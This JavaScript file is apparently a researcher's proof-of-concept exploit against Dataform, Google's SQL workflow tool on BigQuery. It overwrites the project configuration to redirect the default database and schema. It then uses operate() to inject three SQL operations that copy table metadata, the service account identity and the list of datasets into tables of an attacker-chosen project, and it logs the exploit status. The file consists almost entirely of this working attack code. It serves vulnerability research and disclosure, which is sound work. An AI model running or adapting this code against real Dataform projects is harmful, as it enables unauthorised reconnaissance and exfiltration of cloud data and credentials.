// =============================================================================
// EXPLOIT: Configuration Pollution + Dynamic Action Creation
// =============================================================================
//
// This is a .js file (not .sqlx) which allows us to call operate() directly
// at the top level, creating new actions in the compilation.
//
// Attack flow:
// 1. Poison dataform.projectConfig
// 2. Call operate() to create operations with malicious SQL
// 3. The operations are included in the compilation output
// 4. When workflow is executed, our SQL runs in BigQuery
//
// =============================================================================

// Step 1: Log original config
const originalConfig = {
  defaultDatabase: dataform.projectConfig.defaultDatabase,
  defaultSchema: dataform.projectConfig.defaultSchema,
  frozen: Object.isFrozen(dataform.projectConfig)
};

// Step 2: Poison the config
dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

// Step 3: Create malicious operations using operate()
// These will execute arbitrary SQL when the workflow runs

// Operation 1: Exfiltrate INFORMATION_SCHEMA metadata
operate("exfil_metadata")
  .queries([
    `-- EXPLOIT: Exfiltrate all table metadata from INFORMATION_SCHEMA
     CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.exfil_metadata\` AS
     SELECT
       table_catalog as project_id,
       table_schema as dataset_id,
       table_name,
       table_type,
       creation_time,
       CAST(row_count AS INT64) as row_count,
       CAST(size_bytes AS INT64) as size_bytes,
       CURRENT_TIMESTAMP() as exfil_time
     FROM \`shir-research-3.region-us.INFORMATION_SCHEMA.TABLES\`
     WHERE table_schema NOT LIKE 'INFORMATION_SCHEMA%'
     ORDER BY size_bytes DESC
     LIMIT 1000`
  ]);

// Operation 2: Capture the service account identity
operate("exfil_identity")
  .queries([
    `-- EXPLOIT: Capture service account identity
     CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.exfil_identity\` AS
     SELECT
       SESSION_USER() as service_account,
       CURRENT_TIMESTAMP() as captured_at,
       @@project_id as current_project`
  ]);

// Operation 3: List all datasets in the project
operate("exfil_datasets")
  .queries([
    `-- EXPLOIT: Enumerate all datasets
     CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.exfil_datasets\` AS
     SELECT
       catalog_name,
       schema_name as dataset_id,
       creation_time,
       last_modified_time,
       location
     FROM \`shir-research-3.region-us.INFORMATION_SCHEMA.SCHEMATA\``
  ]);

// Log exploit status
console.log("EXPLOIT COMPILED:", JSON.stringify({
  originalConfig,
  poisonedConfig: {
    defaultDatabase: dataform.projectConfig.defaultDatabase,
    defaultSchema: dataform.projectConfig.defaultSchema
  },
  operationsCreated: ["exfil_metadata", "exfil_identity", "exfil_datasets"]
}));
